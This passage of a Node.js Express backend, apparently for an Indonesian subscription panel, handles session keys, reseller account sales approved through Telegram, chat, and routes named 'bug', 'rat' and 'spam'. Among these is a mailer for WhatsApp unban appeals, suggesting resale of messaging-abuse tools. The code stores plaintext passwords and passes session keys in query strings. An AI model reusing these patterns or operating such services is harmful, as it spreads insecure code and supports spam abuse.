  const keyList = loadKeyList();
  const userKey = keyList.find(k => k.username === username);

  if (!userKey) {
    console.log("[❌ KEY] Invalid or missing session key.");
    return res.json({ valid: false, reason: "session" });
  }

  if (userKey.androidId !== androidId) {
    console.log("[⚠️ DEVICE] Device mismatch:", userKey.androidId, "!=", androidId);
    return res.json({ valid: false, reason: "device" });
  }

  if (!user) {
    console.log("[❌ INFO] User not found.");
    return res.json({ valid: false });
  }

  if (isExpired(user)) {
    console.log("[⚠️ INFO] User expired.");
    return res.json({ valid: true, expired: true });
  }

  if (!user.uid) {
    user.uid = crypto.createHash('md5').update(user.username).digest('hex');
    saveDatabase(db);
  }

  recordKey({
    username,
    key,
    role: user.role || 'member',
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId
  });

  if (key) {
    ratSessions[key] = { username: user.username, uid: user.uid };
    activeKeys[key] = activeKeys[key] || {
      username: user.username,
      created: Date.now(),
      expires: Date.now() + 10 * 60 * 1000,
    };
  }

  console.log("[✅ INFO] Info dikirim untuk:", username);

  return res.json({
    valid: true,
    expired: false,
    key,
    username: user.username,
    password: "******",
    expiredDate: user.expiredDate,
    role: user.role || "member",
    uid: user.uid,
    listBug: bugs,
    news: news
  });
});

app.post("/changepass", (req, res) => {
  const { username, oldPass, newPass } = req.body;
  if (!username || !oldPass || !newPass) {
    return res.json({ success: false, message: "Incomplete data" });
  }

  const db = loadDatabase();
  const idx = db.findIndex(u => u.username === username && u.password === oldPass);
  if (idx === -1) {
    return res.json({ success: false, message: "Invalid credentials" });
  }

  db[idx].password = newPass;
  saveDatabase(db);

  return res.json({ success: true, message: "Password updated successfully" });
});

app.get("/createAccount", (req, res) => {
  const { key, newUser, pass, day } = req.query;
  console.log(`[👤 CREATE] Request create user '${newUser}' dengan key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ CREATE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);
  const creatorRole = (creator?.role || 'member').toLowerCase();
  const normalizedCreatorRole = ['dev','kingz'].includes(creatorRole) ? 'pemula' : creatorRole;

  if (!creator || CANNOT_CREATE_ROLES.includes(normalizedCreatorRole)) {
    console.log(`[❌ CREATE] ${creator?.username || "Unknown"} tidak memiliki izin.`);
    return res.json({ valid: true, authorized: false, message: "Role ini tidak diizinkan membuat akun." });
  }

  if (db.find(u => u.username === newUser)) {
    console.log("[❌ CREATE] Username sudah digunakan.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day || 30));

  const newAccount = {
    username: newUser,
    password: pass,
    expiredDate: expired.toISOString().split("T")[0],
    role: "member",
    uid: crypto.createHash('md5').update(newUser).digest('hex'),
    createdBy: creator.username,
    createdAt: new Date().toISOString()
  };

  db.push(newAccount);
  saveDatabase(db);
  void notifyAccountCreated(newAccount, 'APK');

  saveUserLog(creator.username, "create", "Buat Akun Member", `User: ${newUser} | Durasi: ${day} Hari`);

  console.log(`[✅ CREATE] Akun berhasil dibuat: ${newUser}`);
  const logLine = `${creator.username} Created ${newUser} duration ${day}\n`;
  appendLogAsync('logUser.txt', logLine);

  return res.json({ valid: true, created: true, user: newAccount });
});

app.get('/api/admin/sales', ratRequireAuth, (req, res) => {
  const role = String(ratGetRole(req.username) || '').toLowerCase();
  if (!['pemula', 'owner', 'reseller'].includes(role))
    return res.status(403).json({ ok: false, message: 'Akses riwayat penjualan ditolak.' });
  const rawItems = loadPurchases();
  const visibleItems = ['owner','reseller'].includes(role) ? rawItems.filter(x => x.seller === req.username) : rawItems;
  const items = (Array.isArray(visibleItems) ? visibleItems : []).filter(x => x && typeof x === 'object').slice().sort((a,b) => String(b.createdAt||'').localeCompare(String(a.createdAt||'')));
  const accepted = items.filter(x => String(x.status || '').toLowerCase() === 'accepted');
  const income = accepted.reduce((sum, x) => sum + (Number(x.price) || 0), 0);
  const byRole = {};
  for (const x of accepted) {
    const key = x.mode === 'upgrade' ? String(x.to||'upgrade').toUpperCase() : String(x.account?.role||'unknown').toUpperCase();
    byRole[key] = (byRole[key] || 0) + 1;
  }
  return res.json({ ok:true, totalIncome:income, totalSales:accepted.length, pending:items.filter(x=>String(x.status||'').toLowerCase()==='pending').length, byRole, items:items.slice(0,250).map(x=>({id:x.id,mode:x.mode,username:x.account?.username||x.username,role:x.mode==='upgrade'?x.to:x.account?.role,from:x.from||null,price:Number(x.price)||0,status:x.status,createdAt:x.createdAt,decidedAt:x.decidedAt||null})) });
});

app.post('/api/seller/create-account', ratRequireAuth, uploadBukti.single('proof'), async (req,res) => {
  try {
    const sellerRole=String(ratGetRole(req.username)||'').toLowerCase();
    if(!['owner','reseller'].includes(sellerRole)) return res.status(403).json({ok:false,message:'Menu ini khusus OWNER dan RESELLER.'});
    if(!ACC_GROUP_ID) return res.status(503).json({ok:false,message:'Grup transaksi OWNER belum dikonfigurasi.'});
    const username=String(req.body.username||'').trim();
    const password=String(req.body.password||'');
    const role=String(req.body.role||'').toLowerCase();
    const proofPath=req.file?.path;
    const allowed=sellerRole==='owner'?['reseller','fullup','member']:['fullup','member'];
    if(!/^[a-zA-Z0-9_.-]{3,32}$/.test(username)||password.length<4||!allowed.includes(role)) return res.status(400).json({ok:false,message:'Username/password/role tidak valid.'});
    if(!proofPath) return res.status(400).json({ok:false,message:'Bukti transaksi wajib diunggah.'});
    if(loadDatabase().some(u=>String(u.username).toLowerCase()===username.toLowerCase())) return res.status(409).json({ok:false,message:'Username sudah digunakan.'});
    const prices={reseller:80000,fullup:40000,member:20000};
    const account=buildAccountObject({username,password,role,day:30,createdBy:req.username});
    const id='seller_'+Date.now()+'_'+crypto.randomBytes(3).toString('hex');
    const items=loadPurchases();
    const entry={id,mode:'seller_create',seller:req.username,sellerRole,account,username,price:prices[role],label:role.toUpperCase(),proofPath,status:'pending',createdAt:new Date().toISOString()};
    items.push(entry);
    savePurchases(items);
    try {
      if (!bot || typeof bot.sendPhoto !== 'function') throw new Error('Bot Telegram belum siap.');
      await bot.sendPhoto(ACC_GROUP_ID,proofPath,{caption:`🧾 <b>AKSES JUALAN — PERLU ACC</b>\nPenjual: <code>${req.username}</code> (${sellerRole.toUpperCase()})\nBuyer: <code>${username}</code>\nRole: <b>${role.toUpperCase()}</b>\nNominal: Rp${prices[role].toLocaleString('id-ID')}\nID: <code>${id}</code>`,parse_mode:'HTML',reply_markup:{inline_keyboard:[[{text:'✅ ACC & BUAT AKUN',callback_data:`acc_purchase_${id}`},{text:'❌ TOLAK',callback_data:`rej_purchase_${id}`}]]}});
    } catch (telegramError) {
      entry.notificationStatus='failed'; entry.notificationError=String(telegramError.message||telegramError).slice(0,300); entry.updatedAt=new Date().toISOString();
      savePurchases(items);
      console.error('[SELLER TELEGRAM]', telegramError.message);
      return res.status(502).json({ok:false,id,historySaved:true,message:`Transaksi tercatat, notif Owner gagal: ${entry.notificationError}`});
    }
    return res.json({ok:true,id,message:'Bukti dikirim ke grup OWNER. Akun dibuat setelah ACC.'});
  } catch(e){ console.error('[SELLER CREATE]',e.stack||e.message); return res.status(500).json({ok:false,message:`Gagal: ${e.message||'kesalahan server'}`}); }
});

app.get('/api/seller/sales', ratRequireAuth, (req,res)=>{
  try {
    const role=String(ratGetRole(req.username)||'').toLowerCase();
    if(!['owner','reseller','pemula'].includes(role)) return res.status(403).json({ok:false,message:`Akses ditolak untuk role ${role || 'tidak diketahui'}.`});
    const all=loadPurchases();
    const items=all.filter(x=>x && (role === 'pemula' || x.seller===req.username));
    const accepted=items.filter(x=>String(x.status||'').toLowerCase()==='accepted');
    return res.json({ok:true,totalIncome:accepted.reduce((n,x)=>n+(Number(x.price)||0),0),totalSales:accepted.length,pending:items.filter(x=>String(x.status||'').toLowerCase()==='pending').length,items:items.map(x=>({id:x.id,username:x.account?.username||x.username,role:x.account?.role||x.to||x.label,price:Number(x.price)||0,status:x.status||'pending',createdAt:x.createdAt||null,decidedAt:x.decidedAt||null}))});
  } catch(e) { console.error('[SELLER SALES]', e.stack||e.message); return res.status(500).json({ok:false,message:`Gagal: ${e.message||'kesalahan penyimpanan'}`}); }
});

app.post('/purchase/request', uploadBukti.single('proof'), async (req, res) => {
  try {
    if (!ACC_GROUP_ID) return res.status(503).json({ok:false,message:'TELEGRAM_CREATE_NOTIFY_GROUP_ID belum dikonfigurasi.'});
    const mode = String(req.body.mode || 'purchase');
    const username = String(req.body.username || '').trim();
    const password = String(req.body.password || '');
    const product = String(req.body.product || '');
    const currentUsername = String(req.body.currentUsername || '').trim();
    const key = String(req.body.key || '');
    const proofPath = req.file ? req.file.path : null;
    if (!proofPath) return res.status(400).json({ ok:false, message:'Upload bukti pembayaran wajib.' });
    if (mode === 'purchase') {
      const plan = PURCHASE_PRICES[product];
      if (!plan) return res.status(400).json({ ok:false, message:'Paket tidak valid.' });
      if (!username || !password || username.length < 3 || password.length < 4)
        return res.status(400).json({ ok:false, message:'Username minimal 3, password minimal 4 karakter.' });
      if (['kingz','dev'].includes(plan.role)) return res.status(400).json({ ok:false, message:'Role ini tidak dijual.' });
      if (loadDatabase().some(u => u.username === username)) return res.status(409).json({ ok:false, message:'Username sudah digunakan.' });
      const account = buildAccountObject({username,password,role:plan.role,day:plan.day,createdBy:'BUY_ACCESS'});
      const reqId = 'buy_' + Date.now() + '_' + crypto.randomBytes(3).toString('hex');
      const items = loadPurchases();
      items.push({id:reqId, mode, account, product, price:plan.price, label:plan.label, proofPath, status:'pending', createdAt:new Date().toISOString()});
      savePurchases(items);
      await bot.sendPhoto(ACC_GROUP_ID, proofPath, {
        caption:`🧾 <b>BUY ACCESS — MENUNGGU ACC</b>\nUsername: <code>${username}</code>\nRole: <b>${plan.label}</b>\nDurasi: ${plan.day} hari\nHarga: Rp${plan.price.toLocaleString('id-ID')}\nID: <code>${reqId}</code>`,
        parse_mode:'HTML',
        reply_markup:{inline_keyboard:[[{text:'✅ ACC & BUAT AKUN',callback_data:`acc_purchase_${reqId}`},{text:'❌ TOLAK',callback_data:`rej_purchase_${reqId}`}]]}
      });
      return res.json({ok:true,message:'Bukti terkirim. Akun aktif setelah ACC di grup Telegram.'});
    }
    if (mode === 'upgrade') {
      if (!key || !currentUsername) return res.status(400).json({ok:false,message:'Sesi login tidak valid.'});
      const keyInfo = activeKeys[key];
      const db = loadDatabase();
      const actor = keyInfo && db.find(u => u.username === keyInfo.username);
      const target = db.find(u => u.username === currentUsername);
      if (!actor || !target || actor.username !== target.username)
        return res.status(403).json({ok:false,message:'Akun/sesi tidak valid.'});
      const from = String(target.role || '').toLowerCase(), to = String(product || '').toLowerCase();
      const price = UPGRADE_PRICES[`${from}:${to}`];
      if (!price) return res.status(400).json({ok:false,message:'Upgrade role tidak diizinkan.'});
      const reqId = 'up_' + Date.now() + '_' + crypto.randomBytes(3).toString('hex');
      const items = loadPurchases();
      items.push({id:reqId,mode,username:target.username,from,to,price,proofPath,status:'pending',createdAt:new Date().toISOString()});
      savePurchases(items);
      await bot.sendPhoto(ACC_GROUP_ID, proofPath, {
        caption:`⬆️ <b>UP ROLE — MENUNGGU ACC</b>\nUser: <code>${target.username}</code>\nRole: ${from.toUpperCase()} → <b>${to.toUpperCase()}</b>\nHarga: Rp${price.toLocaleString('id-ID')}\nID: <code>${reqId}</code>`,
        parse_mode:'HTML',
        reply_markup:{inline_keyboard:[[{text:'✅ ACC & AKTIFKAN',callback_data:`acc_purchase_${reqId}`},{text:'❌ TOLAK',callback_data:`rej_purchase_${reqId}`}]]}
      });
      return res.json({ok:true,message:'Permintaan upgrade terkirim. Role aktif setelah ACC.'});
    }
    return res.status(400).json({ok:false,message:'Mode tidak valid.'});
  } catch(e) {
    console.error('[PURCHASE]',e.message);
    return res.status(500).json({ok:false,message:'Gagal: '+e.message});
  }
});

app.post("/createAccount", (req, res) => {
  const { key, newUser, pass, day } = req.body;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);
  const creatorRole = (creator?.role || 'member').toLowerCase();
  const normalizedCreatorRole = ['dev','kingz'].includes(creatorRole) ? 'pemula' : creatorRole;

  if (!creator || CANNOT_CREATE_ROLES.includes(normalizedCreatorRole)) {
    return res.json({ valid: true, authorized: false, message: "Role ini tidak diizinkan membuat akun." });
  }

  if (db.find(u => u.username === newUser)) {
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day || 30));

  const newAccount = {
    username: newUser,
    password: pass,
    expiredDate: expired.toISOString().split("T")[0],
    role: "member",
    uid: crypto.createHash('md5').update(newUser).digest('hex'),
    createdBy: creator.username,
    createdAt: new Date().toISOString()
  };

  db.push(newAccount);
  saveDatabase(db);
  void notifyAccountCreated(newAccount, 'APK');

  return res.json({ valid: true, created: true, user: newAccount });
});

app.get("/deleteUser", (req, res) => {
  const { key, username } = req.query;
  console.log(`[🗑️ DELETE] Request hapus user '${username}' oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, error: true, message: "Invalid key." });

  const db = loadDatabase();
  const deleter = db.find(u => u.username === keyInfo.username);
  const targetUser = db.find(u => u.username === username);

  if (!deleter || !targetUser) return res.json({ valid: true, deleted: false, message: "User not found." });

  const deleterRole = (deleter.role || 'member').toLowerCase();
  const targetRole = (targetUser.role || 'member').toLowerCase();
  const deleterLevel = ROLE_LEVEL[deleterRole] || 0;
  const targetLevel = ROLE_LEVEL[targetRole] || 0;

  if (deleterLevel <= targetLevel) {
    return res.json({ valid: true, authorized: false, message: "Role ini tidak bisa menghapus user dengan role setara atau lebih tinggi." });
  }

  const index = db.findIndex(u => u.username === username);
  if (index !== -1) {
    const deletedUser = db[index];
    db.splice(index, 1);
    saveDatabase(db);
    const logLine = `${deleter.username} Deleted ${username}\n`;
    appendLogAsync('logUser.txt', logLine);
    return res.json({ valid: true, deleted: true, user: deletedUser });
  }

  return res.json({ valid: true, deleted: false, message: "Failed to delete user." });
});

app.get("/listUsers", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, error: true, message: "Invalid key." });

  const db = loadDatabase();
  const requester = db.find(u => u.username === keyInfo.username);
  const requesterRole = (requester?.role || 'member').toLowerCase();
  const normalizedRequesterRole = ['dev','kingz'].includes(requesterRole) ? 'pemula' : requesterRole;

  if (!requester || CANNOT_CREATE_ROLES.includes(normalizedRequesterRole)) {
    return res.json({ valid: true, authorized: false, message: "Access denied." });
  }

  const users = db.map(u => ({
    username: u.username,
    expiredDate: u.expiredDate,
    role: u.role || "member",
    uid: u.uid || '-',
    parent: u.createdBy || "SYSTEM"
  }));

  return res.json({ valid: true, authorized: true, users });
});

app.get("/userAdd", async (req, res) => {
  try {
    const { key, username, password, role, day } = req.query;
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

    const db = loadDatabase();
    const creator = db.find(u => u.username === keyInfo.username);
    const creatorRole = (creator?.role || 'member').toLowerCase();
    const normalizedCreatorRole = ['dev','kingz'].includes(creatorRole) ? 'pemula' : creatorRole;

    if (!creator || CANNOT_CREATE_ROLES.includes(normalizedCreatorRole)) {
      return res.json({ valid: true, authorized: false, message: "Role ini tidak diizinkan membuat akun." });
    }

    const roleKey = String(role || 'member').toLowerCase();
    if (!canCreatorMakeRole(normalizedCreatorRole, roleKey)) {
      return res.json({ valid: true, authorized: false, message: `Role ${normalizedCreatorRole} tidak boleh membuat ${roleKey}.` });
    }

    if (needsPhotoForCreate(normalizedCreatorRole)) {
      return res.json({
        valid: true,
        authorized: true,
        needPhoto: true,
        created: false,
        message: "Wajib upload bukti TRX. Gunakan POST /userAdd (multipart)."
      });
    }

    if (db.find(u => u.username === username)) {
      return res.json({ valid: true, created: false, message: "Username already exists." });
    }

    const account = buildAccountObject({ username, password, role: roleKey, day, createdBy: creator.username });
    const result = await commitAccountCreate(account, { status: 'accepted', source: 'APK', note: 'PEMULA instant' });
    if (!result.ok) return res.json({ valid: true, created: false, message: result.message });

    const logLine = `${creator.username} Created ${username} Role ${roleKey} Days ${account.day}\n`;
    appendLogAsync('logUser.txt', logLine);
    return res.json({ valid: true, authorized: true, created: true, status: 'accepted', user: result.user });
  } catch (e) {
    console.error('[userAdd GET]', e);
    return res.status(500).json({ valid: false, message: e.message });
  }
});

app.post("/userAdd", uploadBukti.single('bukti'), async (req, res) => {
  try {
    const key = req.body.key || req.query.key;
    const username = req.body.username || req.query.username;
    const password = req.body.password || req.query.password;
    const role = req.body.role || req.query.role || 'member';
    const day = req.body.day || req.query.day || '30';

    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

    const db = loadDatabase();
    const creator = db.find(u => u.username === keyInfo.username);
    const creatorRole = (creator?.role || 'member').toLowerCase();
    const normalizedCreatorRole = ['dev','kingz'].includes(creatorRole) ? 'pemula' : creatorRole;

    if (!creator || CANNOT_CREATE_ROLES.includes(normalizedCreatorRole)) {
      return res.json({ valid: true, authorized: false, message: "Role ini tidak diizinkan membuat akun." });
    }

    const roleKey = String(role || 'member').toLowerCase();
    if (!ROLE_HIERARCHY.includes(roleKey)) {
      return res.json({ valid: true, authorized: false, message: "Role tidak valid." });
    }
    if (!canCreatorMakeRole(normalizedCreatorRole, roleKey)) {
      return res.json({ valid: true, authorized: false, message: `Role ${normalizedCreatorRole} tidak boleh membuat ${roleKey}.` });
    }

    if (db.find(u => u.username === username)) {
      return res.json({ valid: true, created: false, message: "Username already exists." });
    }

    const account = buildAccountObject({ username, password, role: roleKey, day, createdBy: creator.username });
    const photoPath = req.file ? req.file.path : null;
    const isMember = roleKey === 'member';
    const isPemula = normalizedCreatorRole === 'pemula';

    if (isPemula) {
      const result = await commitAccountCreate(account, { status: 'accepted', source: 'APK', note: 'PEMULA instant', photoPath });
      if (!result.ok) return res.json({ valid: true, created: false, message: result.message });
      return res.json({ valid: true, authorized: true, created: true, status: 'accepted', user: result.user });
    }

    if (!photoPath) {
      return res.json({ valid: true, authorized: true, needPhoto: true, created: false, message: "Wajib upload foto bukti TRX (field: bukti)." });
    }

    if (isMember) {
      await sendCreateToTelegramGroup({ account, creator, photoPath, autoAccept: true });
      const result = await commitAccountCreate(account, { status: 'accepted', source: 'APK', note: 'MEMBER auto (foto terkirim)', photoPath });
      if (!result.ok) return res.json({ valid: true, created: false, message: result.message });
      return res.json({ valid: true, authorized: true, created: true, status: 'accepted', autoMember: true, user: result.user });
    }

    const tg = await sendCreateToTelegramGroup({ account, creator, photoPath, autoAccept: false });
    if (!tg.ok) return res.json({ valid: true, created: false, message: tg.message });

    return res.json({
      valid: true,
      authorized: true,
      created: false,
      pending: true,
      status: 'pending',
      pendingId: tg.pendingId,
      message: "Menunggu ACC di grup Telegram."
    });
  } catch (e) {
    console.error('[userAdd POST]', e);
    return res.status(500).json({ valid: false, message: e.message });
  }
});

app.get("/createHistory", (req, res) => {
  try {
    const { key } = req.query;
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });
    const db = loadDatabase();
    const me = db.find(u => u.username === keyInfo.username);
    if (!me) return res.json({ valid: false, message: "User not found." });

    const role = (me.role || 'member').toLowerCase();
    const normalizedRole = ['dev','kingz'].includes(role) ? 'pemula' : role;
    let history = loadCreateHistory();
    if (normalizedRole !== 'pemula') {
      history = history.filter(h => h.createdBy === me.username);
    }
    return res.json({ valid: true, history });
  } catch (e) {
    return res.status(500).json({ valid: false, message: e.message });
  }
});

app.get("/editUser", (req, res) => {
  const { key, username, addDays } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const editor = db.find(u => u.username === keyInfo.username);
  const targetUser = db.find(u => u.username === username);

  if (!editor) {
    return res.json({ valid: true, authorized: false, message: "Access denied." });
  }

  const editorRole = (editor.role || 'member').toLowerCase();
  const normalizedEditorRole = ['dev','kingz'].includes(editorRole) ? 'pemula' : editorRole;
  if (CANNOT_CREATE_ROLES.includes(normalizedEditorRole)) {
    return res.json({ valid: true, authorized: false, message: "Access denied." });
  }

  if (!targetUser) return res.json({ valid: true, edited: false, message: "User not found." });

  const targetRole = (targetUser.role || 'member').toLowerCase();
  if ((ROLE_LEVEL[normalizedEditorRole] || 0) <= (ROLE_LEVEL[targetRole] || 0)) {
    return res.json({ valid: true, edited: false, message: "Cannot edit user with higher or equal rank." });
  }

  const currentDate = new Date(targetUser.expiredDate);
  currentDate.setDate(currentDate.getDate() + parseInt(addDays));
  targetUser.expiredDate = currentDate.toISOString().split("T")[0];

  saveDatabase(db);
  const logLine = `${editor.username} Edited ${targetUser.username} Add Days ${addDays}\n`;
  appendLogAsync('logUser.txt', logLine);
  return res.json({ valid: true, authorized: true, edited: true, user: targetUser });
});

app.get("/getLog", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  const role = (user?.role || '').toLowerCase();
  const normalizedRole = ['dev','kingz'].includes(role) ? 'pemula' : role;

  if (!user || normalizedRole !== "pemula") {
    return res.json({ valid: true, authorized: false, message: "Access denied." });
  }

  try {
    const logContent = fs.readFileSync("logUser.txt", "utf-8");
    return res.json({ valid: true, authorized: true, logs: logContent });
  } catch (err) {
    return res.json({ valid: true, authorized: true, logs: "", error: "Failed to read log file." });
  }
});

app.get("/getMyActivity", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, message: "Invalid session key" });

  const username = keyInfo.username;
  const userLogPath = path.join(LOGS_DIR, `${username}.json`);

  try {
    if (!fs.existsSync(userLogPath)) return res.json({ valid: true, activities: [] });
    const logs = JSON.parse(fs.readFileSync(userLogPath, 'utf8'));
    logs.sort((a, b) => b.timestamp - a.timestamp);
    return res.json({ valid: true, activities: logs });
  } catch (err) {
    return res.status(500).json({ valid: false, message: "Gagal mengambil log" });
  }
});

const SPAM_CONFIG_FILE = path.join(__dirname, 'sonata_spam_config.json');
function readSpamConfig() {
  try { return JSON.parse(fs.readFileSync(SPAM_CONFIG_FILE, 'utf8')); }
  catch (_) { return { globalMt: '', appealTo: process.env.FIX_MERAH_TO_EMAIL || '', appealSubject: process.env.FIX_MERAH_SUBJECT || 'Permohonan peninjauan pendaftaran WhatsApp' }; }
}
function writeSpamConfig(c) { fs.writeFileSync(SPAM_CONFIG_FILE, JSON.stringify(c, null, 2)); }
function spamAuth(req,res) { const user=authUserFromRequest(req); if(!user){res.status(401).json({success:false,message:'Sesi tidak valid. Silakan login ulang.'});return null;} return user; }
function isPemulaRole(user) { const r = String(user?.role||'').toLowerCase(); return ['pemula','dev','kingz'].includes(r); }

app.get('/api/redgray/spam/global-mt', (req,res) => {
  const user=spamAuth(req,res); if(!user)return; const c=readSpamConfig();
  res.json({success:true,text:String(c.globalMt||''),configured:!!c.globalMt});
});
app.post('/api/redgray/spam/global-mt', (req,res) => {
  const user=spamAuth(req,res); if(!user)return; if(!isPemulaRole(user))return res.status(403).json({success:false,message:'Hanya PEMULA yang boleh atur MT GLOBAL.'});
  const text=String(req.body?.text||'').trim(); if(text.length<10||text.length>5000)return res.status(400).json({success:false,message:'Teks MT GLOBAL 10–5000 karakter.'});
  const c=readSpamConfig(); c.globalMt=text; c.updatedAt=new Date().toISOString(); c.updatedBy=String(user.username||'PEMULA'); writeSpamConfig(c); res.json({success:true,message:'MT GLOBAL tersimpan.'});
});
app.post('/api/redgray/spam/appeal', async (req,res) => {
  const user=spamAuth(req,res); if(!user)return;
  const phone=String(req.body?.phone||'').trim(); const mode=String(req.body?.mode||'').toUpperCase(); const text=String(req.body?.text||'').trim();
  if(!/^\+?[0-9]{7,16}$/.test(phone.replace(/[\s()-]/g,'')))return res.status(400).json({success:false,message:'Format nomor tidak valid.'});
  if(!['GLOBAL','PRIBADI'].includes(mode))return res.status(400).json({success:false,message:'Mode MT tidak valid.'});
  if(text.length<10||text.length>5000)return res.status(400).json({success:false,message:'Teks banding 10–5000 karakter.'});
  const c=readSpamConfig(); const to=String(process.env.FIX_MERAH_TO_EMAIL||c.appealTo||'').trim();
  const from=String(process.env.FIX_MERAH_GMAIL_USER||'').trim(); const pass=String(process.env.FIX_MERAH_GMAIL_APP_PASSWORD||'').trim();
  if(!to||!from||!pass)return res.status(503).json({success:false,message:'Layanan email banding belum dikonfigurasi.'});
  try {
    const nodemailer = require('nodemailer');
    const transporter=nodemailer.createTransport({host:'smtp.gmail.com',port:587,secure:false,requireTLS:true,auth:{user:from,pass},connectionTimeout:20000,socketTimeout:30000});
    const body=text.replace(/\{nomor\}/g,phone)+'\n\nNomor terkait: '+phone+'\nPengajuan dibuat melalui SONATA oleh: '+String(user.username||'user');
    const info=await transporter.sendMail({from,to,subject:String(process.env.FIX_MERAH_SUBJECT||c.appealSubject||'Permohonan peninjauan pendaftaran WhatsApp'),text:body});
    return res.json({success:true,message:'Email pengajuan terkirim.',messageId:info.messageId});
  } catch(e) { console.error('[FIX MERAH] email failed:',e.message); return res.status(502).json({success:false,message:'Email banding gagal dikirim.'}); }
});
function amPremEndpoint() { return String(process.env.AM_PREM_API_URL||'').trim(); }
app.post('/api/redgray/amprem/start', async (req,res) => {
  const user=spamAuth(req,res); if(!user)return; const email=String(req.body?.email||'').trim().toLowerCase();
  if(!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email))return res.status(400).json({success:false,message:'Format email tidak valid.'});
  const endpoint=amPremEndpoint(); if(!endpoint)return res.status(503).json({success:false,message:'Endpoint AM PREM belum dikonfigurasi.'});
  try { const r=await axios.post(endpoint,{action:'send-magiclink',email},{timeout:30000,headers:{'Content-Type':'application/json'}}); const d=r.data||{}; return res.status(r.status).json({success:d.success===true,message:d.message|| (d.success?'Permintaan tautan verifikasi diproses.':'Layanan gagal memproses permintaan.')}); }
  catch(e){console.error('[AM PREM start]',e.message);return res.status(502).json({success:false,message:'Server AM PREM tidak dapat dihubungi.'});}
});
app.post('/api/redgray/amprem/verify', async (req,res) => {
  const user=spamAuth(req,res); if(!user)return; const email=String(req.body?.email||'').trim().toLowerCase(); const rawLink=String(req.body?.rawLink||'').trim();
  if(!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email))return res.status(400).json({success:false,message:'Format email tidak valid.'});
  let parsed; try{parsed=new URL(rawLink);}catch(_){return res.status(400).json({success:false,message:'Tautan verifikasi tidak valid.'});}
  if(!['https:'].includes(parsed.protocol))return res.status(400).json({success:false,message:'Tautan harus HTTPS.'});
  const endpoint=amPremEndpoint(); if(!endpoint)return res.status(503).json({success:false,message:'Endpoint AM PREM belum dikonfigurasi.'});
  try { const r=await axios.post(endpoint,{action:'verify-account',email,rawLink},{timeout:30000,headers:{'Content-Type':'application/json'}}); const d=r.data||{}; return res.status(r.status).json({success:d.success===true,message:d.message||(d.success?'Tautan diproses.':'Verifikasi gagal.')}); }
  catch(e){console.error('[AM PREM verify]',e.message);return res.status(502).json({success:false,message:'Server verifikasi tidak dapat dihubungi.'});}
});

app.get('/ping', (req, res) => {
  res.send('pong');
});

function authUserFromRequest(req) {
  const key = req.headers['x-auth-token'] || req.headers.authorization?.replace(/^Bearer\s+/i, '') || req.query.session_key || req.body?.session_key;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return null;
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return null;
  return user;
}

app.post('/api/heartbeat', (req, res) => {
  const user = authUserFromRequest(req);
  if (!user) return res.status(401).json({ valid: false, message: 'Invalid session' });
  markOnline(user.username, user.role);
  res.json({ valid: true, username: user.username, online: true, expiresInMs: ONLINE_TTL_MS });
});

app.post('/api/online/heartbeat', (req, res) => {
  const user = authUserFromRequest(req);
  if (!user) return res.status(401).json({ valid: false, message: 'Invalid session' });
  markOnline(user.username, user.role);
  res.json({ valid: true, username: user.username, online: true, expiresInMs: ONLINE_TTL_MS });
});

app.get('/api/online-users', (req, res) => {
  const user = authUserFromRequest(req);
  if (!user) return res.status(401).json({ valid: false, message: 'Invalid session' });
  const users = onlineUserList().filter(u => u.username !== user.username);
  res.json({ valid: true, users, count: users.length });
});

app.get('/api/chat/room', (req, res) => {
  const user = authUserFromRequest(req);
  if (!user) return res.status(401).json({ valid: false, message: 'Invalid session' });
  markOnline(user.username, user.role);
  const messages = chatList.filter(m => m.to === 'public' || m.room === 'global').slice(-200);
  res.json({ valid: true, messages, onlineUsers: onlineUserList() });
});

app.post('/api/chat/room', (req, res) => {
  const user = authUserFromRequest(req);
  if (!user) return res.status(401).json({ valid: false, message: 'Invalid session' });
  const message = sanitize(String(req.body?.message || '')).trim();
  if (!message || message.length > 500) return res.status(400).json({ valid: false, message: 'Message kosong atau terlalu panjang' });
  markOnline(user.username, user.role);
  const chat = { from: user.username, to: 'public', room: 'global', message, role: user.role, time: new Date().toISOString(), created_at: new Date().toISOString() };
  chatList.push(chat); saveChat();
  for (const ws of Object.values(wsClients)) if (ws.readyState === WebSocket.OPEN) ws.send(JSON.stringify({ type: 'room_message', message: chat }));
  res.json({ valid: true, message: chat });
});

app.get('/api/chat/users', (req, res) => {
  const user = authUserFromRequest(req);
  if (!user) return res.status(401).json({ valid: false, message: 'Invalid session' });
  markOnline(user.username, user.role);
  res.json({ valid: true, users: onlineUserList().filter(u => u.username !== user.username) });
});

app.get('/api/chat/private/:username', (req, res) => {
  const user = authUserFromRequest(req);
